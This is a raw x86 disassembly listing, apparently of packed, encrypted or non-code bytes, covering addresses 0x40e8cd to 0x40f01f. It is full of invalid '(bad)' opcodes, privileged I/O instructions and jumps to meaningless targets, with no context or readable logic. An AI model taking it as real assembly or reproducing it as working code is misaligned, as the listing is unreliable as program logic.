  40e8cd:	adc    DWORD PTR ds:0xffe2b340,0x46b35f45
  40e8d7:	leave  
  40e8d8:	ins    BYTE PTR es:[edi],dx
  40e8d9:	add    al,0xd5
  40e8db:	gs cld 
  40e8dd:	jle    0x40e931
  40e8df:	xlat   BYTE PTR ds:[ebx]
  40e8e0:	dec    ecx
  40e8e1:	add    al,0xe0
  40e8e3:	jns    0x40e8c5
  40e8e5:	sbb    BYTE PTR es:[edi+0x511982e0],ch
  40e8ec:	inc    ebp
  40e8ed:	push   edx
  40e8ee:	test   DWORD PTR [edx+0xe7514f7],edi
  40e8f4:	sahf   
  40e8f5:	push   ecx
  40e8f6:	in     eax,0x0
	...
  40e93c:	add    BYTE PTR [eax],al
  40e93e:	add    BYTE PTR [eax+0x34],ch
  40e941:	fs mov esi,0xf6fafe7c
  40e947:	mov    bl,0x9d
  40e949:	aam    0xd4
  40e94b:	mov    ds:0x9b096142,eax
  40e950:	out    dx,eax
  40e951:	add    BYTE PTR [eax],al
  40e953:	and    BYTE PTR [edi],al
  40e955:	add    BYTE PTR [eax],al
  40e957:	jmp    0x40e95e
  40e959:	xor    al,0x9a
  40e95b:	dec    ebx
  40e95c:	loope  0x40e908
  40e95e:	out    0xe8,eax
  40e960:	add    al,0x11
  40e962:	inc    edi
  40e963:	mov    ds:0x493a659f,al
  40e968:	xor    eax,ebx
  40e96a:	push   esp
  40e96b:	dec    esi
  40e96c:	pop    ecx
  40e96d:	mov    ebp,0xca2b7137
  40e972:	add    dl,BYTE PTR [edx+eiz*2-0x52]
  40e976:	or     esp,DWORD PTR [esi+0x4d]
  40e979:	loop   0x40e906
  40e97b:	lahf   
  40e97c:	sbb    DWORD PTR [ecx-0x41ac5bb2],ecx
  40e982:	mov    edi,0x3b127dd1
  40e987:	xor    eax,0xa7fa9b3e
  40e98c:	adc    DWORD PTR [edx+0x2a],0x5a
  40e990:	int3   
  40e991:	fcomp  st(2)
  40e993:	sbb    al,0x1e
  40e995:	out    0x86,al
  40e997:	or     BYTE PTR [ecx-0x67],cl
  40e99a:	xor    al,0x5a
  40e99c:	push   edx
  40e99d:	inc    ebp
  40e99e:	adc    bl,BYTE PTR [edi+0x559a179e]
  40e9a4:	(bad)  
  40e9a5:	seta   bl
  40e9a8:	dec    edx
  40e9a9:	mov    ds:0x79176a95,al
  40e9ae:	retf   
  40e9af:	std    
  40e9b0:	cs cmc 
  40e9b2:	(bad)  
  40e9b3:	inc    BYTE PTR [ebp+0x131a336a]
  40e9b9:	sub    DWORD PTR [esi+0x54],esp
  40e9bc:	fsubr  QWORD PTR [ebx-0x41082150]
  40e9c2:	outs   dx,BYTE PTR ds:[esi]
  40e9c3:	sbb    ecx,DWORD PTR [eax+0xa0ab6c4]
  40e9c9:	jl     0x40e982
  40e9cb:	call   0x5f48:0x54866253
  40e9d2:	stc    
  40e9d3:	test   bl,al
  40e9d5:	jecxz  0x40e98c
  40e9d7:	pop    esp
  40e9d8:	mov    edi,0x457ac36
  40e9dd:	inc    edx
  40e9de:	jp     0x40e9ff
  40e9e0:	cmp    eax,0x63dfd58
  40e9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9e6:	push   ebp
  40e9e7:	lock cmp al,0x8f
  40e9ea:	mov    eax,ds:0x4bd33adf
  40e9ef:	cmp    DWORD PTR [eax],edx
  40e9f1:	mov    edi,0xdbb26fe9
  40e9f6:	ins    BYTE PTR es:[edi],dx
  40e9f7:	outs   dx,DWORD PTR ds:[esi]
  40e9f8:	mov    dh,0x65
  40e9fa:	inc    edi
  40e9fb:	push   cs
  40e9fc:	add    eax,0x87facb5e
  40ea01:	jnp    0x40ea28
  40ea03:	out    dx,eax
  40ea04:	dec    esp
  40ea05:	inc    esp
  40ea06:	add    ebx,DWORD PTR [ecx-0x14]
  40ea09:	adc    DWORD PTR [edx-0x1258949e],ecx
  40ea0f:	inc    ecx
  40ea10:	mov    eax,ds:0xaca5b063
  40ea15:	adc    dh,BYTE PTR [ecx+0x55]
  40ea18:	push   ecx
  40ea19:	cmp    eax,0x16f292f4
  40ea1e:	push   ebx
  40ea1f:	gs push ebx
  40ea21:	test   al,0x8c
  40ea23:	or     ebx,DWORD PTR [esp+esi*8]
  40ea26:	and    cl,BYTE PTR [ebp+0x380c47ef]
  40ea2c:	sub    bl,dh
  40ea2e:	push   ecx
  40ea2f:	jmp    DWORD PTR [esi]
  40ea31:	xor    ah,BYTE PTR [ebx]
  40ea33:	stos   BYTE PTR es:[edi],al
  40ea34:	xchg   edx,eax
  40ea35:	mov    BYTE PTR [edi-0x10],ah
  40ea38:	(bad)  [edi+0x5d94c6a5]
  40ea3e:	sbb    dl,BYTE PTR [ebp+0x18]
  40ea41:	mov    cl,0xe3
  40ea43:	dec    ebx
  40ea44:	sti    
  40ea45:	fwait
  40ea46:	(bad)  
  40ea47:	in     al,0x74
  40ea49:	lods   eax,DWORD PTR ds:[esi]
  40ea4a:	loopne 0x40e9ea
  40ea4c:	das    
  40ea4d:	mov    cl,0x30
  40ea4f:	xchg   BYTE PTR [ecx],ch
  40ea51:	arpl   WORD PTR [ecx-0x7d],cx
  40ea54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea55:	repz sbb DWORD PTR [ebx],eax
  40ea58:	aam    0x19
  40ea5a:	pushf  
  40ea5b:	or     ebx,eax
  40ea5d:	inc    edi
  40ea5e:	pop    ebx
  40ea5f:	adc    edx,0x4b262550
  40ea65:	ror    cl,0x78
  40ea68:	ffree  st(2)
  40ea6a:	cmp    DWORD PTR [esi],esi
  40ea6c:	loopne 0x40ea0a
  40ea6e:	mov    cl,0xc6
  40ea70:	adc    ch,0x9a
  40ea73:	fldcw  WORD PTR [ebp+0xf]
  40ea76:	mov    esp,0x3b8f3273
  40ea7b:	pop    edi
  40ea7c:	aas    
  40ea7d:	ja     0x40ea75
  40ea7f:	clc    
  40ea80:	mov    al,ds:0x985049ba
  40ea85:	mov    dh,0x5d
  40ea87:	ss pop ebp
  40ea89:	(bad)  
  40ea8a:	jnp    0x40eae4
  40ea8c:	lods   al,BYTE PTR ds:[esi]
  40ea8d:	lds    ecx,FWORD PTR [eax-0x1da20d97]
  40ea93:	cmp    ebx,DWORD PTR [ebx]
  40ea95:	cs pop ss
  40ea97:	push   ss
  40ea98:	(bad)
  40ea9b:	sbb    al,0x32
  40ea9d:	(bad)  
  40ea9e:	fidivr DWORD PTR [ebp+edi*4+0x58]
  40eaa2:	push   ebp
  40eaa3:	mov    BYTE PTR [edx-0x7c],bl
  40eaa6:	push   ecx
  40eaa7:	retf   0xd3a5
  40eaaa:	test   DWORD PTR [ebx+0x24b2ce4f],esi
  40eab0:	and    al,0xb3
  40eab2:	out    0x93,al
  40eab4:	out    0x29,al
  40eab6:	outs   dx,DWORD PTR ds:[esi]
  40eab7:	jae    0x40eae4
  40eab9:	fst    QWORD PTR [ebx-0x36b2f1b6]
  40eabf:	sbb    bh,cl
  40eac1:	mov    ds:0x95ab81d0,al
  40eac6:	push   ebx
  40eac7:	xchg   esp,eax
  40eac8:	pop    ebx
  40eac9:	rcr    dl,cl
  40eacb:	icebp  
  40eacc:	add    ah,BYTE PTR [ebp-0x244113ed]
  40ead2:	loope  0x40ead6
  40ead4:	push   edi
  40ead5:	hlt    
  40ead6:	sbb    BYTE PTR [edx-0x5d],ah
  40ead9:	xchg   BYTE PTR [edx-0xcfbf769],cl
  40eadf:	add    al,0xe4
  40eae1:	div    DWORD PTR [esi+0x57]
  40eae4:	jb     0x40eb42
  40eae6:	push   ecx
  40eae7:	cs mov eax,0xd57344a5
  40eaed:	mov    ebp,0x7dfc7be1
  40eaf2:	into   
  40eaf3:	popf   
  40eaf4:	int    0xfc
  40eaf6:	and    al,bh
  40eaf8:	dec    edx
  40eaf9:	inc    ecx
  40eafa:	push   0x25
  40eafc:	std    
  40eafd:	outs   dx,DWORD PTR ds:[esi]
  40eafe:	inc    ecx
  40eaff:	stos   DWORD PTR es:[edi],eax
  40eb00:	add    ch,BYTE PTR [ebp-0x61]
  40eb03:	lods   al,BYTE PTR ds:[esi]
  40eb04:	fistp  QWORD PTR [ecx]
  40eb06:	dec    ebp
  40eb07:	pushf  
  40eb08:	fcomp  DWORD PTR [ebp-0x6b]
  40eb0b:	jnp    0x40eb16
  40eb0d:	cmc    
  40eb0e:	dec    eax
  40eb0f:	jmp    0x40ead8
  40eb11:	(bad)  
  40eb12:	in     al,dx
  40eb13:	xchg   ebx,eax
  40eb14:	mov    esi,gs
  40eb16:	rcl    BYTE PTR [esi+0x13],cl
  40eb19:	jno    0x40eb1b
  40eb1b:	in     eax,0x40
  40eb1d:	(bad)  
  40eb1e:	pop    ss
  40eb1f:	popa   
  40eb20:	pop    es
  40eb21:	sbb    eax,ebx
  40eb23:	fwait
  40eb24:	xchg   edi,eax
  40eb25:	lods   al,BYTE PTR ds:[esi]
  40eb26:	fcmovu st,st(7)
  40eb28:	ins    BYTE PTR es:[edi],dx
  40eb29:	mov    al,0x3a
  40eb2b:	fidiv  DWORD PTR ds:0x80c5cadf
  40eb31:	cmc    
  40eb32:	scas   eax,DWORD PTR es:[edi]
  40eb33:	int    0xff
  40eb35:	dec    ebp
  40eb36:	mov    DWORD PTR [ebx],esp
  40eb38:	inc    esp
  40eb39:	mov    ds,WORD PTR [ebp-0x3d]
  40eb3c:	push   0xf83786cf
  40eb41:	lods   eax,DWORD PTR ds:[esi]
  40eb42:	ror    DWORD PTR [edx-0x3e],cl
  40eb45:	jmp    0x69a:0xff36687f
  40eb4c:	test   al,0x43
  40eb4e:	leave  
  40eb4f:	ins    DWORD PTR es:[edi],dx
  40eb50:	xchg   esi,eax
  40eb51:	and    DWORD PTR [ecx+ebx*1-0x1ac5f01d],esi
  40eb58:	adc    al,0x55
  40eb5a:	into   
  40eb5b:	ins    BYTE PTR es:[edi],dx
  40eb5c:	addr16 mov eax,0x2cec8066
  40eb62:	mov    cl,0xbd
  40eb64:	mov    eax,ds:0x1cd4ce1d
  40eb69:	mov    ch,0xf3
  40eb6b:	fnstsw WORD PTR [ecx-0x70]
  40eb6e:	inc    BYTE PTR [ecx-0x3f64bc23]
  40eb74:	rol    DWORD PTR [ecx+ebx*1+0x1d11f645],1
  40eb7b:	icebp  
  40eb7c:	xor    esi,ecx
  40eb7e:	add    edi,DWORD PTR [edx-0x4f424c3c]
  40eb84:	je     0x40ebac
  40eb86:	ret    0xd814
  40eb89:	add    cl,ch
  40eb8b:	jmp    0xed5c197a
  40eb90:	fstp   TBYTE PTR [ebp+0x65298411]
  40eb96:	call   0xbe1a:0xa41bcad3
  40eb9d:	(bad)  
  40eb9e:	call   0xec6e704c
  40eba3:	xor    BYTE PTR [ebx],0xf3
  40eba6:	cld    
  40eba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eba8:	xchg   esi,eax
  40eba9:	push   ecx
  40ebaa:	cwde   
  40ebab:	xor    al,BYTE PTR [edx]
  40ebad:	or     edx,DWORD PTR [edx+edi*1+0x59]
  40ebb1:	scas   al,BYTE PTR es:[edi]
  40ebb2:	adc    dh,BYTE PTR ss:[edi]
  40ebb5:	data16 sub BYTE PTR [eax+0x42],al
  40ebb9:	mov    ah,0x1e
  40ebbb:	sbb    ah,al
  40ebbd:	cmc    
  40ebbe:	out    0xbd,eax
  40ebc0:	ss loope 0x40ec24
  40ebc3:	aas    
  40ebc4:	scas   al,BYTE PTR es:[edi]
  40ebc5:	aam    0xad
  40ebc7:	enter  0xe40c,0x81
  40ebcb:	lods   eax,DWORD PTR ds:[esi]
  40ebcc:	iret   
  40ebcd:	push   ebp
  40ebce:	adc    al,dl
  40ebd0:	stos   BYTE PTR es:[edi],al
  40ebd1:	inc    edx
  40ebd2:	xchg   esp,eax
  40ebd3:	dec    edi
  40ebd4:	mov    bh,0xb7
  40ebd6:	jmp    0x7c74140a
  40ebdb:	mov    dl,0xef
  40ebdd:	pop    edi
  40ebde:	icebp  
  40ebdf:	add    al,0x70
  40ebe1:	adc    cl,cl
  40ebe3:	ret    
  40ebe4:	push   ds
  40ebe5:	pushf  
  40ebe6:	xor    dh,bh
  40ebe8:	sbb    eax,0xc3edeff2
  40ebed:	jg     0x40ec0f
  40ebef:	addr16 mov ah,0x36
  40ebf2:	mov    eax,DWORD PTR [edx+0x47066ac8]
  40ebf8:	push   ds
  40ebf9:	mov    edx,esi
  40ebfb:	lods   al,BYTE PTR ds:[esi]
  40ebfc:	fwait
  40ebfd:	scas   al,BYTE PTR es:[edi]
  40ebfe:	(bad)  
  40ec01:	loop   0x40ebc0
  40ec03:	jmp    0x40ec16
  40ec05:	out    0x1c,eax
  40ec07:	(bad)  
  40ec08:	pop    esi
  40ec09:	xchg   edi,eax
  40ec0a:	mov    eax,ds:0x9e1f53ec
  40ec0f:	and    al,BYTE PTR ds:0x28cd0d73
  40ec15:	inc    eax
  40ec16:	mov    cl,0xee
  40ec18:	daa    
  40ec19:	cmp    al,0x78
  40ec1b:	jle    0x40ebe5
  40ec1d:	or     ecx,0xffffffe2
  40ec20:	clc    
  40ec21:	leave  
  40ec22:	gs sub eax,0x7b62dcf
  40ec28:	or     al,0xab
  40ec2a:	and    eax,0xd0e2e610
  40ec2f:	and    al,0xf1
  40ec31:	in     eax,dx
  40ec32:	iret   
  40ec33:	std    
  40ec34:	mov    eax,ds:0x5aae5d6f
  40ec39:	dec    eax
  40ec3a:	loop   0x40ec65
  40ec3c:	and    DWORD PTR [ebx],edx
  40ec3e:	out    0x74,al
  40ec40:	pop    ebp
  40ec41:	in     al,dx
  40ec42:	in     al,0x18
  40ec44:	das    
  40ec45:	mov    esi,0xcb80458b
  40ec4a:	enter  0xfd9,0xbf
  40ec4e:	ret    0xbedf
  40ec51:	sti    
  40ec52:	adc    DWORD PTR [esi-0x5a],esi
  40ec55:	dec    ebp
  40ec56:	jbe    0x40ec67
  40ec58:	and    edx,edi
  40ec5a:	push   es
  40ec5b:	inc    ebp
  40ec5c:	push   edi
  40ec5d:	repz jmp 0x40ec91
  40ec60:	out    0xf9,eax
  40ec62:	xadd   BYTE PTR [eax],dl
  40ec65:	mov    eax,ds:0xa4acbe95
  40ec6a:	out    dx,al
  40ec6b:	push   ds
  40ec6c:	cwde   
  40ec6d:	add    DWORD PTR [edx-0x2],esp
  40ec70:	test   al,0x56
  40ec72:	test   BYTE PTR [ebp-0x59448143],al
  40ec78:	mov    edi,0x1fd3ce5a
  40ec7d:	stos   DWORD PTR es:[edi],eax
  40ec7e:	and    cl,dl
  40ec80:	mov    DWORD PTR [ebp-0x6321a2bd],ecx
  40ec86:	mov    ebx,edx
  40ec88:	das    
  40ec89:	cdq    
  40ec8a:	jo     0x40ec2e
  40ec8c:	and    eax,0xa7c88be9
  40ec91:	mul    DWORD PTR [ebp+esi*4+0x63]
  40ec95:	in     al,0xf5
  40ec97:	add    al,dh
  40ec99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec9a:	iret   
  40ec9b:	add    eax,0x94f87b
  40eca0:	or     cl,BYTE PTR [edx]
  40eca2:	mov    esp,0x787ad8da
  40eca7:	cmp    DWORD PTR [ecx],edi
  40eca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecaa:	jmp    DWORD PTR [ebx]
  40ecac:	mov    esi,0x984654ac
  40ecb1:	jnp    0x40ecd5
  40ecb3:	cmp    BYTE PTR [ebp+0x7c5418f8],ah
  40ecb9:	inc    esi
  40ecba:	jbe    0x40eca2
  40ecbc:	(bad)  
  40ecbd:	mov    al,ds:0xa3d87b5
  40ecc2:	fdivr  QWORD PTR [ebp-0x70]
  40ecc5:	cmp    DWORD PTR [ebx+0x42],0x3d
  40ecc9:	adc    BYTE PTR [esi],dh
  40eccb:	xor    al,0xd
  40eccd:	pop    esp
  40ecce:	getsec 
  40ecd0:	ret    0x5251
  40ecd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecd4:	cmp    DWORD PTR [ebp+ebx*4+0x60],esi
  40ecd8:	sbb    eax,0x4286492c
  40ecdd:	lds    ebx,FWORD PTR [ebx]
  40ecdf:	loopne 0x40ecb7
  40ece1:	les    edi,FWORD PTR [edx]
  40ece3:	inc    edx
  40ece4:	out    0xee,al
  40ece6:	in     eax,dx
  40ece7:	inc    esp
  40ece8:	mov    ss,WORD PTR [ecx+esi*2+0x1]
  40ecec:	lahf   
  40eced:	mov    al,ds:0xbf4e9c78
  40ecf2:	int    0x63
  40ecf4:	fisub  WORD PTR [eax+edx*1-0x3a]
  40ecf8:	inc    edi
  40ecf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecfa:	sub    DWORD PTR [edi],eax
  40ecfc:	popa   
  40ecfd:	xor    DWORD PTR [edi+0x1101981e],ecx
  40ed03:	sbb    al,bl
  40ed05:	xor    esi,DWORD PTR [eax-0x56]
  40ed08:	push   eax
  40ed09:	repz in al,0x1c
  40ed0c:	jmp    0x764218ef
  40ed11:	enter  0x438a,0xb5
  40ed15:	and    DWORD PTR [ecx+ebx*4],ebp
  40ed18:	mov    al,ds:0x10c87388
  40ed1d:	into   
  40ed1e:	cld    
  40ed1f:	push   es
  40ed20:	bound  esp,QWORD PTR [ecx+0x76]
  40ed23:	test   DWORD PTR [ecx+0x32dcc924],ebx
  40ed29:	(bad)  
  40ed2a:	jmp    0x5a256488
  40ed2f:	add    BYTE PTR [esi],ah
  40ed31:	jl     0x40ed0b
  40ed33:	pop    esp
  40ed34:	xchg   edx,eax
  40ed35:	stos   BYTE PTR es:[edi],al
  40ed36:	mov    dl,0x8
  40ed38:	adc    ebx,esp
  40ed3a:	retf   0x11ad
  40ed3d:	push   eax
  40ed3e:	xchg   esi,eax
  40ed3f:	stc    
  40ed40:	push   edx
  40ed41:	push   es
  40ed42:	pop    edx
  40ed43:	add    al,0xf8
  40ed45:	idiv   BYTE PTR [edi+eiz*4]
  40ed48:	and    al,ch
  40ed4a:	mov    WORD PTR [edx+0x23bc694b],cs
  40ed50:	mov    eax,ds:0x5736d5eb
  40ed55:	sbb    DWORD PTR [ecx+0x15],esi
  40ed58:	aas    
  40ed59:	add    ah,bl
  40ed5b:	xor    BYTE PTR [edi-0x72c3c744],al
  40ed61:	jl     0x40ed65
  40ed63:	mov    ebp,0x754bd4bb
  40ed68:	sbb    ch,BYTE PTR [esp+edx*1+0x1e]
  40ed6c:	leave  
  40ed6d:	repnz clc 
  40ed6f:	sub    al,0x72
  40ed71:	pop    ss
  40ed72:	jp     0x40ede9
  40ed74:	adc    dl,BYTE PTR [ebp+edx*2+0x44]
  40ed78:	test   DWORD PTR [ecx-0x53b8e03e],ecx
  40ed7e:	inc    edi
  40ed7f:	nop
  40ed80:	(bad)  
  40ed81:	xlat   BYTE PTR ds:[ebx]
  40ed82:	mov    bh,0x3c
  40ed84:	dec    dh
  40ed86:	ret    0x8b33
  40ed89:	mov    bl,0x5a
  40ed8b:	or     eax,0xaefa0598
  40ed90:	invd   
  40ed92:	int3   
  40ed93:	scas   eax,DWORD PTR es:[edi]
  40ed94:	scas   al,BYTE PTR es:[edi]
  40ed95:	ja     0x40ed6f
  40ed97:	mov    ebx,0x338a2b1c
  40ed9c:	fwait
  40ed9d:	mov    es,WORD PTR [ecx-0x73f08224]
  40eda3:	push   ebx
  40eda4:	jo     0x40edac
  40eda6:	xlat   BYTE PTR ds:[ebx]
  40eda7:	jns    0x40eda0
  40eda9:	pop    ds
  40edaa:	pop    eax
  40edab:	std    
  40edac:	and    BYTE PTR [ebx-0x22e9905b],bl
  40edb2:	aam    0x17
  40edb4:	mov    dl,0x25
  40edb6:	push   esi
  40edb7:	call   0x1c1efe4d
  40edbc:	in     al,dx
  40edbd:	jg     0x40ed46
  40edbf:	or     eax,0x25920232
  40edc4:	and    cl,BYTE PTR [esi-0x54]
  40edc7:	test   al,0xf5
  40edc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edca:	addr16 jo 0x40ee11
  40edcd:	frstor [ebp-0x2a]
  40edd0:	shl    ebp,1
  40edd2:	or     al,0x6e
  40edd4:	mov    DWORD PTR [ebx],eax
  40edd6:	cmp    BYTE PTR [edx+edx*1],0x74
  40edda:	int3   
  40eddb:	lods   al,BYTE PTR ds:[esi]
  40eddc:	mov    ebp,esi
  40edde:	jnp    0x40edc3
  40ede0:	inc    edx
  40ede1:	mov    ah,0x60
  40ede3:	rcr    DWORD PTR [ebx+0xd0ef4f4],1
  40ede9:	add    al,0xa1
  40edeb:	sub    ch,al
  40eded:	dec    edx
  40edee:	icebp  
  40edef:	push   ds
  40edf0:	ret    
  40edf1:	fwait
  40edf2:	mov    esi,0xee95692e
  40edf7:	arpl   cx,dx
  40edf9:	(bad)  
  40edfa:	loope  0x40ed94
  40edfc:	enter  0xf89e,0x4c
  40ee00:	inc    ebp
  40ee01:	shl    BYTE PTR [eax+0x692337d1],cl
  40ee07:	pushf  
  40ee08:	inc    ebp
  40ee09:	cdq    
  40ee0a:	jle    0x40edba
  40ee0c:	dec    eax
  40ee0d:	iret   
  40ee0e:	pop    esp
  40ee0f:	cmc    
  40ee10:	push   edi
  40ee11:	stos   DWORD PTR es:[edi],eax
  40ee12:	sbb    esp,ebp
  40ee14:	add    ecx,ebx
  40ee16:	fisubr WORD PTR [edi]
  40ee18:	pop    esi
  40ee19:	mov    ch,0xfc
  40ee1b:	mov    dl,0xbd
  40ee1d:	mov    al,0xb4
  40ee1f:	sbb    edi,DWORD PTR [esi-0x59]
  40ee22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee23:	sub    bh,BYTE PTR [edi]
  40ee25:	jmp    0xd7ce3f4a
  40ee2a:	cmp    ebx,DWORD PTR ds:[ecx]
  40ee2d:	ins    DWORD PTR es:[edi],dx
  40ee2e:	shl    DWORD PTR [esi+edx*2-0x4c],cl
  40ee32:	mov    al,0xf1
  40ee34:	xchg   edi,eax
  40ee35:	stos   DWORD PTR es:[edi],eax
  40ee36:	sub    al,0xce
  40ee38:	call   0xedcf9a0a
  40ee3d:	loop   0x40ee42
  40ee3f:	mov    ds:0xcaffce82,al
  40ee44:	je     0x40ee60
  40ee46:	xor    eax,0x3d1f9ae1
  40ee4b:	pop    ebx
  40ee4c:	sub    cl,al
  40ee4e:	push   ss
  40ee4f:	and    ah,cl
  40ee51:	push   es
  40ee52:	or     ebp,edx
  40ee54:	in     eax,dx
  40ee55:	mov    bl,0x3a
  40ee57:	fldenv [ecx]
  40ee59:	mov    eax,ds:0x8b7f8a3b
  40ee5e:	scas   eax,DWORD PTR es:[edi]
  40ee5f:	dec    ebp
  40ee60:	pop    esi
  40ee61:	jo     0x40ee77
  40ee63:	shl    BYTE PTR [ecx-0x4f],0x6a
  40ee67:	mov    bh,0x1
  40ee69:	xor    BYTE PTR [ebx-0x44333ef2],dh
  40ee6f:	xchg   ecx,eax
  40ee70:	sub    eax,0xd08b9c70
  40ee75:	push   0x432d0151
  40ee7a:	sar    BYTE PTR [edx+ebx*2],cl
  40ee7d:	stos   BYTE PTR es:[edi],al
  40ee7e:	into   
  40ee7f:	je     0x40eee7
  40ee81:	stos   DWORD PTR es:[edi],eax
  40ee82:	dec    edx
  40ee83:	ror    DWORD PTR [eax],cl
  40ee85:	jmp    0x40eeb7
  40ee87:	scas   al,BYTE PTR es:[edi]
  40ee88:	adc    ah,0x8f
  40ee8b:	pop    esi
  40ee8c:	dec    ebp
  40ee8d:	mov    bl,0x99
  40ee8f:	aas    
  40ee90:	and    bh,ah
  40ee92:	cmp    bl,BYTE PTR [esi-0x77]
  40ee95:	pop    es
  40ee96:	and    dl,BYTE PTR [ebx+0x28]
  40ee99:	push   ds
  40ee9a:	mov    BYTE PTR [ebp-0x30],ah
  40ee9d:	mov    ds:0xf37cdfaa,al
  40eea2:	jg     0x40ee78
  40eea4:	shr    BYTE PTR [eax+0x6345e4e4],0x38
  40eeab:	lds    esi,FWORD PTR [edx-0x14]
  40eeae:	sbb    eax,0x19731df3
  40eeb3:	cmp    BYTE PTR ds:0x6ad59a88,ah
  40eeb9:	sbb    eax,DWORD PTR [ecx+0xd]
  40eebc:	or     esp,ecx
  40eebe:	jno    0x40ee54
  40eec0:	fistp  WORD PTR [ecx]
  40eec2:	mov    DWORD PTR [ebp-0x1a3f3d48],eax
  40eec8:	or     eax,0xafcc82e
  40eecd:	ja     0x40ef2e
  40eecf:	cmp    al,0x73
  40eed1:	dec    eax
  40eed2:	cwde   
  40eed3:	in     eax,0x49
  40eed5:	mov    ah,0x7c
  40eed7:	adc    ebx,esp
  40eed9:	push   ebp
  40eeda:	pop    ecx
  40eedb:	pop    ebp
  40eedc:	cwde   
  40eedd:	je     0x40ef4e
  40eedf:	mov    ecx,0x357aeb7d
  40eee4:	loop   0x40ef05
  40eee6:	call   0x9f93:0xcbbff92
  40eeed:	or     BYTE PTR [eax],dl
  40eeef:	jmp    0x40328b4d
  40eef4:	and    eax,0x4ae31d9
  40eef9:	or     al,BYTE PTR [edx+0x36]
  40eefc:	inc    eax
  40eefd:	pop    ebp
  40eefe:	inc    ebx
  40eeff:	pushf  
  40ef00:	sar    ecx,cl
  40ef02:	into   
  40ef03:	jge    0x40ee8e
  40ef05:	sbb    dh,BYTE PTR [eax-0x6]
  40ef08:	sbb    al,0x56
  40ef0a:	retf   0xb1b0
  40ef0d:	(bad)  
  40ef0e:	pop    edx
  40ef0f:	xchg   ecx,eax
  40ef10:	sbb    eax,0x921da5af
  40ef15:	inc    esi
  40ef16:	(bad)  
  40ef17:	mov    ch,0x6c
  40ef19:	cmp    dl,BYTE PTR [edi-0x794573cb]
  40ef1f:	les    esi,FWORD PTR [esi+eiz*2-0x579139e3]
  40ef26:	inc    esp
  40ef27:	adc    BYTE PTR [esi-0x259ec80e],0x8
  40ef2e:	xchg   ebp,eax
  40ef2f:	mov    esi,0x964aa477
  40ef34:	and    BYTE PTR [edx-0x2],0x66
  40ef38:	fs pushf 
  40ef3a:	add    BYTE PTR [eax],ah
  40ef3c:	jp     0x40ef63
  40ef3e:	mov    eax,0xa9f20005
  40ef43:	cmp    ebp,DWORD PTR [edx-0x7]
  40ef46:	jmp    0x40ef92
  40ef48:	fwait
  40ef49:	inc    edi
  40ef4a:	mov    dh,0x56
  40ef4c:	push   edi
  40ef4d:	sub    al,BYTE PTR [ebx+eiz*4-0x7edf219b]
  40ef54:	add    DWORD PTR [edx],esp
  40ef56:	push   0xffca8375
  40ef5b:	data16 sub ch,cl
  40ef5e:	lea    edx,[esi-0x5f636a22]
  40ef64:	sbb    BYTE PTR [ebp-0x3c764fdc],al
  40ef6a:	mov    esp,0x2aae2fc0
  40ef6f:	inc    ebx
  40ef70:	mov    esi,0xa12ae635
  40ef75:	lea    esi,[eax]
  40ef77:	xchg   ebx,eax
  40ef78:	cli    
  40ef79:	arpl   WORD PTR [eax+0x130ed776],di
  40ef7f:	add    BYTE PTR [ebx],al
  40ef81:	sbb    DWORD PTR [ebx+esi*8],0xffffffb6
  40ef85:	xchg   edi,eax
  40ef86:	xor    al,0xe
  40ef88:	retf   0xfe6e
  40ef8b:	outs   dx,BYTE PTR ds:[esi]
  40ef8c:	adc    al,BYTE PTR [ecx-0x41]
  40ef8f:	mov    bh,0x81
  40ef91:	inc    ebp
  40ef92:	lahf   
  40ef93:	aam    0x44
  40ef95:	test   al,0x91
  40ef97:	int3   
  40ef98:	mov    eax,0xa973039e
  40ef9d:	cmp    esp,DWORD PTR [edx+0x24]
  40efa0:	pop    ebp
  40efa1:	mov    ecx,0x52e77c43
  40efa6:	jg     0x40f012
  40efa8:	mov    bl,0x77
  40efaa:	cmp    BYTE PTR [edi],ah
  40efac:	lahf   
  40efad:	shr    dl,cl
  40efaf:	daa    
  40efb0:	cmp    cl,BYTE PTR [eax]
  40efb2:	pushf  
  40efb3:	sub    BYTE PTR [ebx],dl
  40efb5:	pusha  
  40efb6:	cmp    eax,esi
  40efb8:	mov    bl,0xb9
  40efba:	in     eax,dx
  40efbb:	ss inc eax
  40efbd:	dec    ebx
  40efbe:	sub    eax,0xbdd5d9bc
  40efc3:	sub    ecx,eax
  40efc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efc6:	inc    esi
  40efc7:	push   edx
  40efc8:	loop   0x40ef7e
  40efca:	xlat   BYTE PTR ds:[ebx]
  40efcb:	setge  BYTE PTR [ebx+0x3aa2c3c2]
  40efd2:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40efd4:	sti    
  40efd5:	mov    WORD PTR [eax+edx*2],es
  40efd8:	andnps xmm6,XMMWORD PTR [eax]
  40efdb:	xor    esp,edi
  40efdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efde:	mov    ah,BYTE PTR [edx]
  40efe0:	(bad)  
  40efe1:	xchg   ebx,eax
  40efe2:	sbb    cl,BYTE PTR [esp+ebx*2-0x668db1c4]
  40efe9:	in     eax,0xfa
  40efeb:	rcl    BYTE PTR [eax],0xef
  40efee:	lods   al,BYTE PTR ds:[esi]
  40efef:	adc    eax,0x28de5875
  40eff4:	iret   
  40eff5:	ins    BYTE PTR es:[edi],dx
  40eff6:	push   ebx
  40eff7:	sub    al,0x64
  40eff9:	int3   
  40effa:	mov    ds,WORD PTR [edi-0x3dd99c11]
  40f000:	sbb    al,0x6a
  40f002:	mov    eax,ds:0xec9a3d0a
  40f007:	cwde   
  40f008:	sbb    al,dh
  40f00a:	out    dx,al
  40f00b:	imul   ecx,ecx,0x35f1c72a
  40f011:	dec    edx
  40f012:	pop    eax
  40f013:	cwde   
  40f014:	sbb    eax,0x45346b27
  40f019:	ja     0x40f024
  40f01b:	push   0xffffffe8
  40f01d:	test   eax,esp
  40f01f:	push   0x45d82249
